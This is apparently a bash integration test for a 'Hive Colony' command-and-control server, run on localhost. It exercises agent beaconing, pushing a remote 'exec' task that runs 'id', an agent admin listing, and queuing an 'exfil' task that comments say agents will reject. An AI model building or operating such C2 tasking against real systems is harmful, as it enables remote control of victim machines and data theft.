#!/usr/bin/env bash
# Hive Colony End-to-End Integration Test (ronda 6: solo infraestructura C2)
set -euo pipefail

C2_PORT=${C2_PORT:-8444}
C2_URL="http://127.0.0.1:${C2_PORT}"
DIR=$(dirname "$0")
PASS=0
FAIL=0

cleanup() {
    echo "=== Cleanup ==="
    pkill -f "c2-server" 2>/dev/null || true
    pkill -f "queen" 2>/dev/null || true
    pkill -f "worker" 2>/dev/null || true
}
trap cleanup EXIT

assert_eq() {
    local desc="$1" expected="$2" actual="$3"
    if [ "$expected" = "$actual" ]; then
        echo "  PASS: $desc"
        PASS=$((PASS + 1))
    else
        echo "  FAIL: $desc (expected: $expected, got: $actual)"
        FAIL=$((FAIL + 1))
    fi
}

assert_contains() {
    local desc="$1" needle="$2" haystack="$3"
    if echo "$haystack" | grep -q "$needle"; then
        echo "  PASS: $desc"
        PASS=$((PASS + 1))
    else
        echo "  FAIL: $desc (missing: $needle)"
        FAIL=$((FAIL + 1))
    fi
}

echo "╔══════════════════════════════════════╗"
echo "║   HIVE COLONY E2E TEST              ║"
echo "╚══════════════════════════════════════╝"
echo ""

# 1. Start C2 server
echo "=== Test 1: Start C2 server ==="
cargo run -p c2-server -- --port "$C2_PORT" --db-path /tmp/hive_e2e.db > /tmp/hive_c2_e2e.log 2>&1 &
C2_PID=$!
sleep 2

HEALTH=$(curl -sf "$C2_URL/health" 2>/dev/null || echo "")
assert_contains "C2 health endpoint" "ok" "$HEALTH"

# 2. Beacon
echo "=== Test 2: Agent beacon ==="
BEACON=$(curl -sf -X POST "$C2_URL/beacon" \
    -H "X-Agent-ID: test-001" \
    -H "X-Agent-Role: worker" \
    -d '{"hostname":"e2e-test","username":"root","os":"linux","version":"3.0.0"}' 2>/dev/null || echo "")
assert_contains "Beacon accepted" "ack" "$BEACON"

# 3. Task push/pull (el endpoint de exfiltración /collect fue eliminado en ronda 6)
echo "=== Test 3: Task push/pull ==="
TASK_PUSH=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "$C2_URL/task/test-001" \
    -H "Content-Type: application/json" \
    -d '{"id":"t1","command":"exec","payload":{"cmd":"id"}}' 2>/dev/null || echo "")
assert_eq "Task push returns 201" "201" "$TASK_PUSH"

TASK_PULL=$(curl -sf "$C2_URL/task/test-001" 2>/dev/null || echo "")
assert_contains "Task pull returns task" "t1" "$TASK_PULL"
assert_contains "Task pull has command" "exec" "$TASK_PULL"

# 4. Agent summary
echo "=== Test 4: Agent admin ==="
AGENTS=$(curl -sf "$C2_URL/admin/agents" 2>/dev/null || echo "")
assert_contains "Agent admin lists agents" "test-001" "$AGENTS"

# 5. Error handling
echo "=== Test 5: Error handling ==="
NOT_FOUND=$(curl -sf -o /dev/null -w "%{http_code}" "$C2_URL/nonexistent" 2>/dev/null || echo "")
assert_eq "Unknown route returns 404" "404" "$NOT_FOUND"

# 6. Rejected destructive task type (ronda 6)
echo "=== Test 6: Destructive task queued (agent will reject) ==="
REJ=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "$C2_URL/task/test-001" \
    -H "Content-Type: application/json" \
    -d '{"id":"t2","command":"exfil","payload":{"path":"/tmp/x"}}' 2>/dev/null || echo "")
assert_eq "Exfil task queued returns 201" "201" "$REJ"

# Summary
echo ""
echo "╔══════════════════════════════════════╗"
echo "║   RESULTS                           ║"
echo "╠══════════════════════════════════════╣"
echo "║  PASS: $PASS"
echo "║  FAIL: $FAIL"
echo "╚══════════════════════════════════════╝"

[ "$FAIL" -eq 0 ] && exit 0 || exit 1
